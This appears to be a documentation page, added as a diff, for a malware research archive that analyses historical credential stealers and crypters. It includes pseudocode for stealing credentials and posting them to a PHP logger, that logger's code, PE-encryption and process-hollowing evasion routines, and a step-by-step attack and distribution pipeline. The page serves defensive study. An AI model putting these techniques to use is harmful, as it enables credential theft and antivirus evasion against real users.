@@ -1,0 +1,467 @@
+---
+title: "Stealers & Crypters"
+description: "The malware support ecosystem - credential theft tools, AV evasion services, and commercialized cybercrime"
+sidebar:
+  order: 4
+---
+
+import { Aside } from '@astrojs/starlight/components';
+
+<Aside type="caution" title="Educational Purpose">
+This page documents historical stealer and crypter specimens for academic research purposes only.
+All specimens are from the publicly archived [MaestroN repository](https://github.com/maestron/botnets).
+Techniques described here are presented to inform defensive cybersecurity strategy.
+</Aside>
+
+## Overview: The Malware Supply Chain
+
+Stealers and crypters are not standalone attack tools - they are **components in a supply chain** that supported the broader malware ecosystem. As malware matured from hobbyist projects to commercial operations, a specialized support industry emerged that directly mirrored legitimate software business models.
+
+```
+┌──────────────────── Malware Supply Chain ────────────────────┐
+│                                                               │
+│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌────────┐ │
+│  │ Exploit  │    │ Stealer/ │    │ Crypter  │    │ Botnet │ │
+│  │ Kit      │───▶│ RAT/Bot  │───▶│ (FUD     │───▶│ Deploy │ │
+│  │ (access) │    │ (payload)│    │ service) │    │ (ops)  │ │
+│  └──────────┘    └──────────┘    └──────────┘    └────────┘ │
+│       │               │               │               │      │
+│   Sold/rented     Built with      Sold as SaaS    Operated  │
+│   on forums       builder tools   with licensing  at scale  │
+└──────────────────────────────────────────────────────────────┘
+```
+
+### Collection Specimens
+
+**Stealers** (credential theft tools):
+
+| Specimen | Language | Target | Key Feature | Source |
+|----------|----------|--------|-------------|--------|
+| **iStealer 5** | VB6 (builder) + C (stub) | Multi-browser, FTP, IM | Builder/stub architecture | [iStealer5 SOURCE](https://github.com/maestron/botnets/tree/master/VirusPack/iStealer5%20SOURCE) |
+| **Dwighlight_Stealer** | Delphi | IE7 passwords | Targeted IE7 credential store | [Dwighlight_Stealer](https://github.com/maestron/botnets/tree/master/VirusPack/Dwighlight_Stealer) |
+| **CC.Trojan.EMAIL3** | Unknown | Credit cards | Fake Windows activation phishing | [CC.Trojan.EMAIL3](https://github.com/maestron/botnets/tree/master/VirusPack/CC.Trojan.EMAIL3) |
+
+**Crypters** (AV evasion tools):
+
+| Specimen | Language | Key Feature | Source |
+|----------|----------|-------------|--------|
+| **DynastryCrypter** | C++ (crypter) + PHP (licensing) | Enterprise-grade PHP licensing backend | [DynastryCrypterSource](https://github.com/maestron/botnets/tree/master/VirusPack/DynastryCrypterSource) |
+| **SPKRYPT** | VB6 | Source-level VB6 obfuscation | [SPKRYPT](https://github.com/maestron/botnets/tree/master/VirusPack/SPKRYPT) |
+| **Crypter** | C++ | PE section encryption | [Crypter](https://github.com/maestron/botnets/tree/master/VirusPack/Crypter) |
+
+---
+
+## iStealer 5: The Builder & Stub Architecture
+
+**Source:** [iStealer5 SOURCE](https://github.com/maestron/botnets/tree/master/VirusPack/iStealer5%20SOURCE)
+
+iStealer exemplifies the **builder/stub model** - the most important architectural innovation in commodity malware usability. This design separates configuration from execution, allowing non-technical operators to generate customized malware payloads through a GUI.
+
+### Architecture: Builder vs. Stub
+
+```
+┌─────────────────────────────────────────────────┐
+│             iStealer Builder (VB6 GUI)           │
+│                                                   │
+│  ┌──────────────────┐  ┌──────────────────────┐  │
+│  │ Configuration    │  │ Build Options         │  │
+│  │                  │  │                       │  │
+│  │ • PHP Logger URL │  │ • ☑ Bind with file   │  │
+│  │   [____________] │  │ • ☑ Change icon      │  │
+│  │                  │  │ • ☑ UPX compress     │  │
+│  │ • Bound file:    │  │ • ☑ Add to startup   │  │
+│  │   [Browse...]    │  │                       │  │
+│  └──────────────────┘  └──────────────────────┘  │
+│                                                   │
+│              [ BUILD EXECUTABLE ]                  │
+│                     │                              │
+│                     ▼                              │
+│  ┌─────────────────────────────────────────────┐  │
+│  │ Builder Process:                             │  │
+│  │ 1. Read stub template (pre-compiled C .exe)  │  │
+│  │ 2. Inject config into PE resource section    │  │
+│  │ 3. Optionally bind with legitimate file      │  │
+│  │ 4. Replace icon with custom .ico             │  │
+│  │ 5. Output: customized stealer executable     │  │
+│  └─────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────┘
+```
+
+### The Stub: What Actually Runs on the Victim
+
+The stub (`Stub/source/main.c`) is a pre-compiled C program - a generic template designed to read its own configuration at runtime:
+
+```
+// iStealer stub execution flow - conceptual
+function main():
+    // Phase 1: Read configuration from own PE resources
+    config = LoadResource(GetModuleHandle(NULL), "CONFIG")
+    logger_url = config.php_url
+    bound_file = config.bound_data
+    startup    = config.add_to_startup
+
+    // Phase 2: If bound file exists, extract and run it
+    // This maintains the victim's expectation (e.g., a game installer)
+    if bound_file != NULL:
+        extract_to_temp(bound_file)
+        ShellExecute(bound_file_path)
+
+    // Phase 3: Steal credentials from all supported applications
+    stolen_data = {}
+    stolen_data["msn"]       = steal_msn_credentials()
+    stolen_data["googletalk"]= steal_gtalk_credentials()
+    stolen_data["firefox"]   = steal_firefox_passwords()
+    stolen_data["ie"]        = steal_ie_protected_storage()
+    stolen_data["filezilla"] = steal_filezilla_config()
+    stolen_data["wsftp"]     = steal_wsftp_credentials()
+    stolen_data["flashfxp"]  = steal_flashfxp_credentials()
+
+    // Phase 4: Send stolen data to attacker's PHP logger
+    http_post(logger_url, format_stolen_data(stolen_data))
+
+    // Phase 5: Optionally install persistence
+    if startup:
+        RegSetValue(HKCU_RUN, "SystemUpdate", self_path)
+```
+
+### Targeted Applications
+
+iStealer demonstrates the breadth of credential sources available on a typical 2007-era Windows machine:
+
+| Category | Applications Targeted | Extraction Method |
+|----------|-----------------------|-------------------|
+| **Web Browsers** | Firefox, Internet Explorer | Profile parsing, Protected Storage API |
+| **IM Clients** | MSN Messenger, Google Talk | Registry + config file parsing |
+| **FTP Clients** | FileZilla, WS_FTP, FlashFXP, SmartFTP | XML config / registry credential stores |
+| **Email** | Outlook, Thunderbird | Profile / Protected Storage |
+
+### PHP Logger Backend
+
+The stolen data is transmitted to an attacker-controlled PHP script:
+
+```
+// PHP logger - conceptual (server-side)
+// Receives stolen credentials from all deployed stealers
+
+<?php
+// logger.php - receives POST data from iStealer stubs
+$ip       = $_SERVER['REMOTE_ADDR'];
+$country  = geoip_lookup($ip);
+$data     = $_POST['data'];     // Encoded stolen credentials
+$hwid     = $_POST['hwid'];     // Hardware ID for dedup
+
+// Log to file or database
+$log_entry = date('Y-m-d H:i:s') . " | $ip | $country\n$data\n---\n";
+file_put_contents("logs/" . date('Y-m-d') . ".txt", $log_entry, FILE_APPEND);
+
+// Some operators sorted logs by credential type:
+// banking_creds.txt, ftp_creds.txt, email_creds.txt
+?>
+```
+
+### MITRE ATT&CK Mapping - iStealer
+
+| Technique | ID | Implementation |
+|-----------|----|----------------|
+| Credentials from Password Stores | T1555 | Extracts saved passwords from browsers/FTP clients |
+| Credentials from Web Browsers | T1555.003 | Firefox profile parsing, IE Protected Storage |
+| Stage Capabilities: Upload Tool | T1608.002 | Builder prepares malware for deployment |
+| Obfuscated Files or Information | T1027 | Icon change + file binding disguises executable |
+| Masquerading | T1036.005 | Bound with legitimate file, custom icon |
+| Exfiltration Over Web Service | T1567 | HTTP POST to PHP logger |
+| Boot or Logon Autostart Execution | T1547.001 | Optional registry persistence |
+
+---
+
+## DynastryCrypter: The Commercialization of Evasion
+
+**Source:** [DynastryCrypterSource](https://github.com/maestron/botnets/tree/master/VirusPack/DynastryCrypterSource)
+
+DynastryCrypter is the most architecturally significant support tool in the collection. It's not just a crypter - it's a **commercially licensed product** with an enterprise-grade PHP backend for customer management. This specimen provides direct evidence of cybercrime-as-a-service (CaaS) in the mid-2000s.
+
+### What a Crypter Does
+
+A crypter's sole purpose is to make an existing executable **Fully Un-Detectable (FUD)** by antivirus software:
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│                   Crypter Transformation                      │
+│                                                                │
+│  INPUT:                          OUTPUT:                       │
+│  ┌────────────────┐             ┌─────────────────────────┐   │
+│  │ malware.exe    │             │ crypted_malware.exe      │   │
+│  │                │   CRYPTER   │                           │   │
+│  │ Detected by    │ ─────────▶  │ ┌─────────────────────┐ │   │
+│  │ 38/68 AV       │             │ │ Decoder Stub        │ │   │
+│  │ engines        │             │ │ (unique per build)  │ │   │
+│  │                │             │ ├─────────────────────┤ │   │
+│  │ [.text section]│             │ │ Encrypted .text     │ │   │
+│  │ [.data section]│             │ │ Encrypted .data     │ │   │
+│  │ [.rsrc section]│             │ │ Encrypted .rsrc     │ │   │
+│  └────────────────┘             │ └─────────────────────┘ │   │
+│                                  │                           │   │
+│                                  │ Detected by 0/68 AV      │   │
+│                                  │ engines (FUD)             │   │
+│                                  └─────────────────────────┘   │
+└──────────────────────────────────────────────────────────────┘
+```
+
+### Encryption Process (Pseudocode)
+
+```
+// DynastryCrypter - PE section encryption, conceptual
+function crypt_executable(input_exe, output_exe):
+    pe = parse_pe(input_exe)
+
+    // Step 1: Generate random encryption key for this build
+    key = random_bytes(16)
+    algorithm = random_choice([XOR, ROL, ROR, WORD_SWAP])
+
+    // Step 2: Encrypt the code and data sections
+    encrypted_text = encrypt(pe.section[".text"], key, algorithm)
+    encrypted_data = encrypt(pe.section[".data"], key, algorithm)
+
+    // Step 3: Generate a unique decoder stub
+    stub = generate_decoder_stub(key, algorithm)
+    // Stub variations: different register allocation, NOP patterns,
+    // junk instruction insertion - each build is unique
+
+    // Step 4: Rebuild PE with stub as new entry point
+    new_pe = create_pe()
+    new_pe.add_section(".stub", stub, executable=True)
+    new_pe.add_section(".enc1", encrypted_text)
+    new_pe.add_section(".enc2", encrypted_data)
+    new_pe.entry_point = new_pe.section[".stub"].virtual_address
+
+    // Step 5: Apply additional evasion layers
+    add_junk_code(new_pe)          // Padding to change file size/hash
+    randomize_section_names(new_pe) // Avoid "packed" heuristics
+
+    write_pe(new_pe, output_exe)
+
+// At runtime on victim machine:
+function decoder_stub_executes():
+    // Step 1: Locate encrypted sections in memory
+    base = GetModuleHandle(NULL)
+    enc_text = find_section(base, ".enc1")
+    enc_data = find_section(base, ".enc2")
+
+    // Step 2: Decrypt in-place
+    decrypt(enc_text, key, algorithm)
+    decrypt(enc_data, key, algorithm)
+
+    // Step 3: Fix memory permissions
+    VirtualProtect(enc_text, size, PAGE_EXECUTE_READWRITE)
+
+    // Step 4: Jump to original entry point
+    jmp(original_entry_point)
+    // The original malware now runs normally in memory
+```
+
+### Process Injection Alternative
+
+Some crypter modes used **process injection** rather than in-place decryption - a more evasive approach:
+
+```
+// Alternative: RunPE / Process Hollowing
+function stub_with_process_injection():
+    // Step 1: Create a suspended legitimate process
+    CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, &pi)
+
+    // Step 2: Hollow out its memory
+    Nt​Unmap​ViewOfSection(pi.hProcess, image_base)
+
+    // Step 3: Allocate new memory and write decrypted payload
+    Virtual​Alloc​Ex(pi.hProcess, image_base, payload_size, ...)
+    Write​Process​Memory(pi.hProcess, image_base, decrypted_payload, ...)
+
+    // Step 4: Set thread context to new entry point and resume
+    SetThreadContext(pi.hThread, &context)
+    ResumeThread(pi.hThread)
+
+    // Result: svchost.exe process running, but its memory
+    // contains the decrypted malware - appears legitimate
+    // in Task Manager and process listings
+```
+
+### The PHP Licensing System
+
+The most remarkable aspect of DynastryCrypter is its **commercial backend** - a complete PHP/MySQL licensing system for selling the crypter as a service:
+
+```
+// DynastryCrypter licensing backend - architecture
+//
+// Directory: DynastryCrypterSource/PHP/
+
+// config.php - database + encryption configuration
+$db_host = "localhost";
+$db_user = "dynasty_user";
+$db_pass = "***";
+$db_name = "dynasty_licenses";
+$first_xor_key  = 0xABCD;    // Client-server auth key
+$second_xor_key = 0x1234;    // License validation key
+
+// login.php - customer authentication portal
+// Customers log in with purchased credentials
+// System validates against database
+
+// License validation flow:
+// 1. Customer launches crypter application
+// 2. Crypter sends HWID + license key to PHP backend
+// 3. Backend validates against database
+// 4. If valid: returns authorization token
+// 5. Crypter enables full functionality
+// If invalid: crypter refuses to encrypt files
+```
+
+### Business Model Analysis
+
+| Aspect | DynastryCrypter Implementation | Legitimate SaaS Parallel |
+|--------|-------------------------------|--------------------------|
+| **Authentication** | PHP login portal | Customer portal (e.g., login.example.com) |
+| **License validation** | HWID binding + server check | Hardware-locked software licensing |
+| **Client-server crypto** | Dual XOR keys for API auth | API key authentication |
+| **Database backend** | MySQL license/customer tables | CRM database |
+| **Revenue model** | Per-license or subscription | SaaS subscription |
+| **Customer support** | Forum threads + Jabber/ICQ | Help desk / chat support |
+| **Product updates** | New stubs when detected | Feature releases and patches |
+
+<Aside type="note" title="The FUD Arms Race">
+The crypter business model created a continuous cycle: 
+
+1. Author releases new crypter version → **"FUD" status** (0 AV detections)
+2. Customers use it heavily → AV vendors obtain samples 
+3. AV vendors add signatures → Detection rate climbs
+4. Crypter is no longer FUD → Customers complain on forums
+5. Author releases update → Return to step 1
+
+This cycle typically ran on a **48-72 hour rotation** for popular crypters. "FUD guarantee" became a selling point - some authors offered refunds or free updates if their crypter was detected within a certain timeframe.
+</Aside>
+
+### MITRE ATT&CK Mapping - DynastryCrypter
+
+| Technique | ID | Implementation |
+|-----------|----|----------------|
+| Obfuscated Files or Information | T1027 | PE section encryption (primary function) |
+| Software Packing | T1027.002 | Custom packing of PE sections |
+| Process Injection | T1055 | RunPE / process hollowing for in-memory execution |
+| Process Hollowing | T1055.012 | CreateProcess suspended → hollow → inject |
+| Deobfuscate/Decode Files | T1140 | Decoder stub reverses encryption at runtime |
+| Virtualization/Sandbox Evasion | T1497 | Some versions detect analysis environments |
+| Application Layer Protocol | T1071.001 | PHP licensing backend for tool distribution |
+
+---
+
+## SPKRYPT: Source-Level Obfuscation
+
+While binary crypters like DynastryCrypter encrypt compiled executables, SPKRYPT takes a different approach - it **obfuscates VB6 source code** before compilation:
+
+```
+// SPKRYPT approach - source-level obfuscation
+//
+// BEFORE SPKRYPT:
+Sub SendData()
+    Dim password As String
+    password = Text1.Text
+    Winsock1.SendData "PASS " & password
+End Sub
+
+// AFTER SPKRYPT:
+Sub a1b2c3()
+    Dim x7y8z9 As String
+    x7y8z9 = a4b5c6.Text
+    d7e8f9.SendData Chr(80) & Chr(65) & Chr(83) & Chr(83) & Chr(32) & x7y8z9
+End Sub
+```
+
+This approach operates at a different level than binary crypters:
+
+| Approach | DynastryCrypter (Binary) | SPKRYPT (Source-Level) |
+|----------|-------------------------|------------------------|
+| **Input** | Compiled .exe | VB6 source code (.frm/.bas) |
+| **Output** | Encrypted .exe | Obfuscated VB6 source |
+| **Evasion target** | AV signature scanning | Source code analysis + decompilation |
+| **Reversibility** | Decrypt in memory at runtime | One-way - original identifiers lost |
+| **When applied** | After compilation | Before compilation |
+
+---
+
+## The Builder/Stub Ecosystem in Context
+
+The iStealer/DynastryCrypter specimens document a complete attack pipeline. Here's how the pieces fit together in a real-world operation:
+
+### Operational Flow
+
+```
+Step 1: ACQUIRE TOOLS
+├── Purchase iStealer builder ($20-50 on forums)
+├── Purchase DynastryCrypter license ($15-30/month)
+└── Set up PHP logger on bulletproof hosting
+
+Step 2: BUILD PAYLOAD
+├── iStealer Builder → Configure logger URL
+├── Bind with legitimate file (game installer)
+├── Set custom icon (game icon)
+└── Output: stealer.exe (detected by 35/68 AV engines)
+
+Step 3: EVADE DETECTION
+├── DynastryCrypter → Load stealer.exe
+├── Encrypt with random key + decoder stub
+└── Output: crypted_stealer.exe (detected by 0/68 AV engines)
+
+Step 4: DISTRIBUTE
+├── Upload to file sharing sites
+├── Post on forums/torrents as "free game"
+├── Send via IM to targets
+└── Upload to exploit kit for drive-by delivery
+
+Step 5: HARVEST
+├── PHP logger receives stolen credentials
+├── Sort by type: banking, FTP, email, gaming
+└── Monetize: sell accounts, drain funds, spam via stolen email
+```
+
+### Economics of the Supply Chain
+
+| Component | Cost (circa 2007-2009) | Revenue Potential |
+|-----------|----------------------|-------------------|
+| iStealer builder | $20-50 one-time | - |
+| DynastryCrypter license | $15-30/month | - |
+| Bulletproof hosting | $50-200/month | - |
+| Traffic (via exploit kit) | $0.10-1.50 per install | - |
+| **Total operational cost** | **~$100-300/month** | - |
+| Stolen FTP accounts | - | $0.50-5 each |
+| Stolen email accounts | - | $0.01-0.10 each (spam) |
+| Stolen banking credentials | - | $50-500 each |
+| Stolen gaming accounts | - | $5-50 each |
+
+---
+
+## Defensive Evolution Driven by Stealers & Crypters
+
+### What Stealers Forced
+
+1. **Credential encryption at rest** - Browsers moved from plaintext/simple storage to encrypted credential databases
+2. **Master password requirements** - Firefox introduced master passwords for the credential store
+3. **OS-level credential protection** - Windows Credential Manager, macOS Keychain evolved to resist direct API extraction
+4. **Two-factor authentication** - Stolen passwords became less valuable when 2FA was required
+
+### What Crypters Forced
+
+1. **Behavioral analysis** - AV had to detect actions (credential access, injection) not just static signatures
+2. **Sandboxed execution** - Automated detonation chambers to observe runtime behavior
+3. **Memory scanning** - Scanning process memory for decrypted payloads, not just on-disk files
+4. **Heuristic unpackers** - Generic detection of the decryption/injection pattern itself
+
+<Aside type="tip" title="Research Connection">
+The builder/stub and crypter-as-a-service models documented here directly parallel the [exploit kit business models](/botnet-research-archive/categories/exploit-packs/). Together, they demonstrate the complete commercialization of the cybercrime supply chain - from access (exploit kits) to payload (builders) to evasion (crypters) to monetization (PPI networks).
+</Aside>
+
+---
+
+## Further Reading
+
+- [Exploit Packs](/botnet-research-archive/categories/exploit-packs/) - The distribution layer of the same supply chain
+- [Cross-Platform Bots](/botnet-research-archive/categories/cross-platform/) - Payloads that were commonly delivered through this pipeline
+- [Malware Economy Analysis](/botnet-research-archive/analysis/malware-economy/) - Broader economic analysis of the cybercrime ecosystem
+- [Master Inventory](/botnet-research-archive/reference/inventory/) - Full collection catalog
